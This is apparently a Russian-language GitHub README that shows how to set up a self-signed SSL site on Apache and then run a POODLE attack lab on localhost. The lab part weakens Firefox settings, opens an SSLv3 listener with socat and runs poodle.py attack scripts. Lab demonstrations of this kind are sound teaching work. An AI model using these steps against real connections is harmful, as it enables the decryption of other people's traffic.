# showcase-of-ssl
# установка ssl
apt-get install openssl
# генерируем ключ 
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/07e50593-2449-4b7d-9237-05ad54894b53)

# создаем свой мини сайт
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/21f58e24-5dc3-44ae-8923-34bbf951e4b6)

# меняем права доступа 
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/9124ae02-ae1c-4ab0-b73c-31bf9eb94fa8)

# создаем виртуальный хост
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/a894b4b2-fca4-4771-a726-b636cebf7990)

# открываем доступ к сайту
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/ca25acea-b6a8-46b5-ad9b-222cb4f71ec7)

# отключаем стандартный ssl
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/aa656573-06ef-4ed0-9fe5-0ca87b23d51a)

# включаем свой ssl 
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/43d2703d-372a-4f88-b0eb-5284523003e1)

# перезапускаем apache2
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/3ccc3d8b-92a2-42ce-a6fd-8454cd47b30b)

# проверяем работу нашего сайта на нашем ssl
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/383beaf5-7389-4eae-b2e0-b14a51d37307)
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/a541d75e-43cf-4971-b907-c84e7c5408f0)
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/6ecc394a-7d14-4dae-8773-dfd891bdf174)





# устанавливаю уязвимость в конфиге браузера firefox
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/64956cb1-ffe1-43bc-a49d-1dd40c78476d)

# создание связи между сервером и ssl listener
socat -v -x OPENSSL-LISTEN:4433,verify=0,method=SSLv3,cert=cert-poodle.pem,key=key-poodle.pem,reuseaddr,fork TCP:localhost:4080

# для использования стандартных правил iptables
./poodle.py --target-port 4433 --start-offset 384 https://localhost:8443

# создание 3х терминалов 
./poodle-dev.sh httpserver
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/777ff6b4-5a38-4dde-9d78-234df41026e7)

./poodle-dev.sh sslserver
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/94165ddd-0219-4f11-b9ae-ffca19f57822)

./poodle-dev.sh attacker-nodebug

# подтверждаем самостоятельно сделанные сертификаты 
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/383beaf5-7389-4eae-b2e0-b14a51d37307)
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/a541d75e-43cf-4971-b907-c84e7c5408f0)


# проводим свою атаку
$ ./poodle.py --target-port 4433 --start-offset 384 https://localhost:8443
![image](https://github.com/razuwaikin/showcase-of-ssl/assets/79261812/9f7c682c-653d-448f-a1cf-90ed5fa0de34)

